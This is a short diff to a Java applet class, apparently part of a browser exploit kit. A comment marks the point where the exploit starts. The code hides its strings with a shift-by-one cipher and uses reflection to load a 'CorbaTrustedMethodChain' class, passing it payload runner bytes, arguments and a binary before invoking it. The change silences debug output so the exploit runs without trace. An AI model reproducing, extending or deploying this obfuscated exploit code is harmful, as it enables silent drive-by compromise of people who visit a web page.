@@ -32,7 +32,7 @@ public class XAppletW extends JApplet {
 		EP.pArgs = new String[3];
 
 		EP.docBase = this.getDocumentBase().toString();
-		System.out.println(x.Strings.dec("Ifmmp!") + EP.docBase);
+		debug(x.Strings.dec("Ifmmp!") + EP.docBase);
 
 		// Starting exploit
 		try {
@@ -116,7 +116,7 @@ public class XAppletW extends JApplet {
 
 			EP.pArgs[2] = encode(resourceKey);
 
-			System.out.println(x.Strings.dec("hfu!dmbtt!y/DpscbUsvtufeNfuipeDibjo-!tfsjbmj{fe;!") + serializedBytes.length);
+			debug(x.Strings.dec("hfu!dmbtt!y/DpscbUsvtufeNfuipeDibjo-!tfsjbmj{fe;!") + serializedBytes.length);
 			// -------------------
 			Class ctmc = cl.getClass(x.Strings.dec("y/DpscbUsvtufeNfuipeDibjo"));
 			ctmc.getField(x.Strings.dec("qbzmpbeSvoofsDmbttCzuft")).set(null, payloadRunnerClassBytes);
@@ -127,10 +127,6 @@ public class XAppletW extends JApplet {
 			ctmc.getField(x.Strings.dec("qDmbtt")).set(null, EP.pClass);
 			ctmc.getField(x.Strings.dec("qBsht")).set(null, EP.pArgs);
 			ctmc.getField(x.Strings.dec("qCjo")).set(null, EP.pBin);
-
-			// ctmc.getField(x.Strings.dec("sObnf")).set(null, resourceName);
-			// ctmc.getField(x.Strings.dec("sLfz")).set(null, resourceKey);
-			// ctmc.getField(x.Strings.dec("vsmCbtf")).set(null, urlBase);
 
 			ctmc.getMethod(x.Strings.dec("hp"), new Class[] {}).invoke(null, new Object[] {});
 		} catch (Exception e) {
@@ -153,7 +149,7 @@ public class XAppletW extends JApplet {
 	}
 
 	private void debug(String string) {
-		System.out.println(string);
+		//System.out.println(string);
 	}
 
 	public byte[] getResourceKey() {
